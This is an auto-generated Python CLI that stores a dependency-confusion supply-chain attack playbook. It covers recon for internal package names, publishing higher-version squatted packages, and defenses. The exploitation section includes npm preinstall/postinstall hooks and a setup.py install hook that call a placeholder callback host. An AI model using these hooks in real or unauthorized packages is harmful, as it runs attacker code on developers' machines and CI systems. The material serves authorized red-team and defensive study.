#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/dependency-confusion

Skill: SKILL: Dependency Confusion — Supply Chain Attack Playbook
Desc : >-

Run:  python hack-skills-dependency-confusion.py --help
      python hack-skills-dependency-confusion.py --list
      python hack-skills-dependency-confusion.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/dependency-confusion'
TITLE = 'SKILL: Dependency Confusion — Supply Chain Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: dependency-confusion", "description: >-", "Supply-chain testing via package-manager dependency confusion: when internal package names resolve to attacker-controlled public registries, leading to malicious install and script execution. Use for npm/pip/gem/Maven/Composer/Docker manifest review and authorized red-team supply-chain exercises."],
    'skill-dependency-confusion-supply-chain-attack-playbook': [],
    '0-quick-start': ["**What to look for first**", "- **Manifests** listing package names that look **internal** (short unscoped names, org-specific tokens, product codenames) without a **hard-private registry lock**.", "- Evidence the **same name** might exist\u2014or be **squattable**\u2014on a **public** registry with a **higher semver** than the private feed publishes.", "- **Lockfiles** missing, stale, or not enforced in CI so `install`/`build` can drift toward public metadata.", "**Fast mental model**: *If the resolver can see both private and public indexes, and version ranges allow it, the \u201cnewest\u201d matching version may be the attacker\u2019s.*", "Routing note: if the task comes from supply-chain, repository exposure, or CI-build recon, first use `recon-for-sec` to list internal package names and possible public-registry collisions."],
    '1-core-concept': ["1. **Private packages**: An organization ships libraries only on an internal registry (or under conventions that imply \u201cours\u201d), e.g. a scoped name like `@org-scope/internal-utils` or an **unscoped** name such as `acme-billing-sdk`.", "2. **Attacker squats the name**: The same package name is published on a **public** registry (npmjs, PyPI, RubyGems, etc.).", "3. **Resolver preference**: Many setups resolve **highest matching version** across **all configured indexes** (or merge metadata), so a public `9.9.9` can beat a private `1.2.3` if ranges allow.", "4. **Execution**: Package managers run **lifecycle scripts** (npm `preinstall`/`postinstall`, setuptools entry points, etc.) \u2192 **attacker code runs** on developer laptops, CI, or production image builds.", "This is a **supply-chain** class issue: impact is often **broad** (many consumers) and **silent** until build or runtime hooks fire."],
    '2-affected-ecosystems': [],
    '3-reconnaissance': ["**Where internal names leak**", "- Committed **`package.json`**, **`requirements.txt`**, **`Gemfile`**, **`pom.xml`**, **`composer.json`** in repos or forks.", "- **JavaScript source maps**, bundled assets, or **error stack traces** referencing package paths.", "- **`.npmrc`**, **`.pypirc`**, **CI logs** showing install URLs or mirror endpoints.", "- **Issue trackers**, **gist snippets**, and **dependency graphs** from SBOM exports.", "**Check public squatting / claimability (read-only)**", "```bash"],
    'npm-metadata-for-a-name-unscoped': ["npm view some-internal-package-name version"],
    'npm-scoped-requires-scope-to-exist-be-readable': ["npm view @some-scope/internal-lib versions --json"],
    'pypi-dry-run-style-version-probe-adjust-name-fails-if-not-found': ["python3 -m pip install --dry-run 'some-internal-package-name==99.99.99'"],
    'rubygems-query-remote': ["gem search '^some-internal-package-name$' --remote"],
    'maven-central-search-coordinates-example-pattern': [],
    'curl-https-search-maven-org-solrsearch-select-q-g-com-example-and-a-internal-lib-rows-1-wt-json': ["Routing note: after package-name enumeration, consider PoC only in authorized environments; public registry lookups themselves are usually passive recon."],
    '4-exploitation': ["**Authorized testing pattern**", "1. **Register** (or use a controlled namespace) the **same package name** on the public registry your target resolver can reach.", "2. Publish a **higher semver** than the legitimate internal line **within the victim\u2019s declared range** (e.g. `^1.0.0` \u2192 publish `9.9.9`).", "3. Add **lifecycle hooks** that prove execution without harming hosts\u2014prefer **DNS/HTTP callback** to a collaborator you control, **no destructive writes**.", "**npm `package.json` \u2014 minimal callback-style PoC (illustrative)**", "```json", "\"name\": \"some-internal-package-name\",", "\"version\": \"9.9.9\",", "\"description\": \"authorized dependency-confusion PoC only\",", "\"scripts\": {", "\"preinstall\": \"node -e \\\"require('https').get('https://YOUR_CALLBACK_HOST/poc?t='+process.env.npm_package_name)\\\"\"", "**npm `package.json` \u2014 shell + curl fallback (illustrative)**", "```json", "\"scripts\": {", "\"postinstall\": \"curl -fsS 'https://YOUR_CALLBACK_HOST/npm-postinstall' || true\"", "**pip \u2014 setup hook pattern (illustrative; use only in authorized lab packages)**", "```python"],
    'setup-py-excerpt': ["from setuptools import setup", "from setuptools.command.install import install", "class PoCInstall(install):", "def run(self):", "import urllib.request", "urllib.request.urlopen(\"https://YOUR_CALLBACK_HOST/pip-install\")", "install.run(self)", "setup(", "name=\"some-internal-package-name\",", "version=\"9.9.9\",", "cmdclass={\"install\": PoCInstall},", "**Reference implementation (study / lab)**: community PoC layout and workflow similar to [`0xsapra/dependency-confusion-exploit`](https://github.com/0xsapra/dependency-confusion-exploit) \u2014 automate version bump, publish, and callback confirmation **only where you have written permission**."],
    '5-tools': ["Run these only against **your** manifests or **authorized** engagements; do not use to squat names for unrelated third parties."],
    '6-defense': ["- **npm**: Prefer **scoped** packages (`@org-scope/pkg`) with **org-owned** scopes; set **`.npmrc`** so private scopes map to private registry and **default `registry`** is not accidentally public for internal names.", "- **Pinning**: **Exact versions** + **lockfiles** (`package-lock.json`, `poetry.lock`, `Gemfile.lock`, `composer.lock`) enforced in CI.", "- **pip**: Avoid careless **`--extra-index-url`**; prefer **single private index** with **mirroring**, or **explicit `--index-url`** policies in CI.", "- **Maven / Gradle**: Control **repository order**, use **internal mirrors**, and **block** unexpected groupIds on release pipelines.", "- **Composer**: Use **`repositories`** with **`canonical: true`** for private packages; verify Packagist is not introducing unexpected vendors.", "- **Defensive registration**: **Reserve** internal names on public registries (squat your own names) where policy allows.", "- **Monitoring**: Tools such as **Socket.dev**, **Snyk**, or similar SBOM/supply-chain scanners to alert on **new publishers** or **version jumps** for critical packages."],
    '7-decision-tree': ["```text", "Do manifests reference package names that could be non-unique globally?", "\u251c\u2500 NO \u2192 Dependency confusion unlikely from naming alone; pivot to typosquatting / compromised accounts.", "\u2514\u2500 YES", "\u251c\u2500 Is the private registry the ONLY source for that name (scoped + .npmrc / single index / mirror)?", "\u2502   \u251c\u2500 YES \u2192 Lower risk; still verify CI and developer machines do not override config.", "\u2502   \u2514\u2500 NO \u2192 HIGH RISK", "\u2502         \u251c\u2500 Can a public registry publish a HIGHER version inside declared ranges?", "\u2502         \u2502   \u251c\u2500 YES \u2192 Treat as exploitable in authorized tests; prove with callback PoC.", "\u2502         \u2502   \u2514\u2500 NO \u2192 Check pre-release tags, local `file:` deps, and stale lockfiles.", "\u2502         \u2514\u2500 Are lifecycle scripts disabled/blocked in CI? (reduces impact, does not remove squat risk)"],
    'related-routing': ["- **From `recon-for-sec`**: When doing **supply-chain reconnaissance**, cross-link leaked manifests and internal package identifiers with the checks in **Section 3** and the decision tree in **Section 7** before proposing any publish/PoC steps."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()